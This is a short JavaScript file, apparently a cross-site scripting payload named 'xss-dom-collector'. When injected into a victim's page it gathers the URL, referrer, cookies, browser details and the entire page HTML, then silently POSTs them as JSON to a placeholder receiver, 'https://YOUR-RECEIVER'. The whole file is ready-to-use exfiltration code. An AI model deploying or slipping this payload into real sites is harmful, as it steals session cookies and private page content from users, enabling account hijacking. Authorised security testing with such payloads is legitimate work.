export async function collect() {
    const data = {
        collector: "xss-dom-collector",
        timestamp: new Date().toISOString(),

        href: location.href,
        origin: location.origin,
        protocol: location.protocol,
        hostname: location.hostname,
        pathname: location.pathname,
        search: location.search,
        hash: location.hash,

        title: document.title,
        referrer: document.referrer,
        domain: document.domain,

        cookies: document.cookie,

        userAgent: navigator.userAgent,
        language: navigator.language,
        platform: navigator.platform,

        isTopLevel: window === window.top,

        screen: {
            width: screen.width,
            height: screen.height,
            availWidth: screen.availWidth,
            availHeight: screen.availHeight,
        },

        viewport: {
            width: window.innerWidth,
            height: window.innerHeight,
            devicePixelRatio: window.devicePixelRatio,
        },

        dom: document.documentElement.outerHTML,
    };

    await fetch("https://YOUR-RECEIVER", {
        method: "POST",
        headers: {
            "Content-Type": "application/json"
        },
        body: JSON.stringify(data)
    });
}

collect().catch(() => {});
